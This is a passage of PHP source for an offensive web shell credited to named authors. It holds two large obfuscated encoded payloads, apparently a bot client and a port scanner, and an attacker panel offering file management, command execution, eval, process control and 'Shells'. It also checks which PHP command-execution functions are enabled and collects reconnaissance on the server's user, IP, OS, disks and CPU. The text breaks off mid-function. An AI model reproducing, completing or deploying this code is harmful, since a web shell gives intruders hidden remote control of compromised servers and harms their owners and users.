$serbotclient = "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";

$bpscan = "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";

?>

Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a> and <a target="_blank" href="https://twitter.com/__A_C_E_S__">Aces</a><br>Greetings to <a target="_blank" href="https://twitter.com/chaoshackerz">ChaosHackerz</a>

<div class="tabs">
	<FORM>
		<INPUT Type="BUTTON" VALUE="Information" ONCLICK="window.location.href='#Information'">
		<INPUT Type="BUTTON" VALUE="File Manager" ONCLICK="window.location.href='#File Manager'">
		<INPUT Type="BUTTON" VALUE="Commander" ONCLICK="window.location.href='#Commander'">
		<INPUT Type="BUTTON" VALUE="Eval" ONCLICK="window.location.href='#Eval'">
		<INPUT Type="BUTTON" VALUE="Process Manager" ONCLICK="window.location.href='#Process Manager'">
		<INPUT Type="BUTTON" VALUE="Shells" ONCLICK="window.location.href='#Shells'">
		<INPUT Type="BUTTON" VALUE="Tools" ONCLICK="window.location.href='#Tools'">
	</FORM>
</div>

<div class="fButton">
	<FORM>
		<INPUT Type="BUTTON" VALUE="Features" ALIGN="middle" ONCLICK="showDiv('features')">
	</FORM>
	
	<form action='?logout=true' method='post'>
		<input type='submit' value='Logout' name='Logout'/>
	</form>
</div>

<br><h3><A NAME='Information' href="#Information">Information</A></h3>

<table>
<tr>
<td>
<table class='flat-table flat-table-2'>
	<tr>
		<th>Useful Function</th>
		<th>Status</th>
	</tr>
	<?php
	
	$php_functions = array("exec", "shell_exec", "passthru", "system", "popen", "proc_open", "curl_version");
	
	foreach($php_functions as $function)
	{
		echo "
		<tr>
			<td>$function</td>";
		if(function_exists($function))
		{
			${"{$function}"} = True;
			echo "
			<td><font color='green'>ENABLED</font></td>
			</tr>";
		}	
		else
		{
			${"{$function}"} = False;
			echo "
			<td><font color='red'>DISABLED</font></td>
			</tr>";
		}
	}

	
	echo "
		<tr>
			<td>nohup</td>";
	if (command_exists("nohup") != "")
	{
		$nohup = True;
		echo "
			<td><font color='green'>ENABLED</font></td>";
	}
	else
	{
		$nohup = False;
		echo "
			<td><font color='red'>DISABLED</font></td>";	
	}

	echo "
		</tr>";

	?>
</table>
</td>
<td>
<table class='flat-table flat-table-2'>
	<tr>
		<th>Name</th>
		<th>Value</th>
	</tr>

	<?php
	
	if(function_exists("php_uname"))
	{
		echo "
		<tr>
			<td>Version</td>
			<td>".php_uname()."</td>
		</tr>";
	}
	else
	{
		echo "
		<tr>
			<td>Version</td>
			<td></td>
		</tr>";
	}

	echo "	
	<tr>
		<td>IP Address</td>
		<td>".$_SERVER['SERVER_ADDR']."</td>
	</tr>";

	if(function_exists("get_current_user"))
	{
		echo "
		<tr>
			<td>Current User</td>
			<td>".get_current_user()."</td>
		</tr>";
	}
	else
	{
		echo "
		<tr>
			<td>Current User</td>
			<td></td>
		</tr>";
	}

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		foreach(range('A','Z') as $letter)
		{
			if(file_exists("$letter:"))
			{
				echo "
				<tr>
					<td>Storage Space $letter: (FREE / TOTAL)</td>";
				$bytes = disk_free_space("$letter:");
				$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
				$base = 1024;
				$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
				$free = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
				$bytes = disk_total_space("$letter:");
				$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
				$base = 1024;
				$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
				$total = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
				echo "
					<td>$free / $total</td>
				</tr>";
			}
		}
	}
	else
	{
		echo"
		<tr>
			<td>Storage Space (FREE / TOTAL)</td>";
		$bytes = disk_free_space(".");
		$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
		$base = 1024;
		$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
		$free = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
		$bytes = disk_total_space(".");
		$si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
		$base = 1024;
		$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
		$total = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
		echo "
			<td>$free / $total</td>
		</tr>";
	}
	
	echo "
	<tr>
		<td>CPU</td>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		if ($shell_exec == True)
		{
			$data = shell_exec('typeperf -sc 1 "\processor(_total)\% processor time"');
			$parts = explode(",", $data);
			if(isset($parts[2]))
			{
				$get_first = explode(",", $data);
				if(isset($get_first[2]))
				{
					$first = str_replace("\"", "", $get_first[2]);
					if(isset($first[0]))
						echo "<td>".round(explode("\n", $first[0]))."% </td>";
					else 
						echo "N/A";
				}
				else 
				{
					echo "N/A";
				}
			}
			else 
			{
				echo "N/A";
			}
		}
		else if($exec == True)
		{
			$data = exec('typeperf -sc 1 "\processor(_total)\% processor time"');
			$parts = explode(",", $data);
			if(isset($parts[2]))
			{
				$get_first = explode(",", $data);
				if(isset($get_first[2]))
				{
					$first = str_replace("\"", "", $get_first[2]);
					if(isset($first[0]))
						echo "<td>".round(explode("\n", $first[0]))."% </td>";
					else 
						echo "N/A";
				}
				else 
				{
					echo "N/A";
				}
			}
			else 
			{
				echo "N/A";
			}		
		}
		else if($popen == true)
		{
			$pid = popen('typeperf -sc 1 "\processor(_total)\% processor time"',"r");
			$data = fread($pid, 2096);
			pclose($pid);
			$parts = explode(",", $data);
			if(isset($parts[2]))
			{
				$get_first = explode(",", $data);
				if(isset($get_first[2]))
				{
					$first = str_replace("\"", "", $get_first[2]);
					if(isset($first[0]))
						echo "<td>".round(explode("\n", $first[0]))."% </td>";
					else 
						echo "N/A";
				}
				else 
				{
					echo "N/A";
				}
			}
			else 
			{
				echo "N/A";
			}			
		}
		else if($proc_open == true)
		{
			$process = proc_open(
				'typeperf -sc 1 "\processor(_total)\% processor time"',	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
			$parts = explode(",", $stdout);
			if(isset($parts[2]))
			{
				$get_first = explode(",", $data);
				if(isset($get_first[2]))
				{
					$first = str_replace("\"", "", $get_first[2]);
					if(isset($first[0]))
						echo "<td>".round(explode("\n", $first[0]))."% </td>";
					else 
						echo "N/A";
				}
				else 
				{
					echo "N/A";
				}
			}
			else 
			{
				echo "N/A";
			}					}
			}
			else
			{
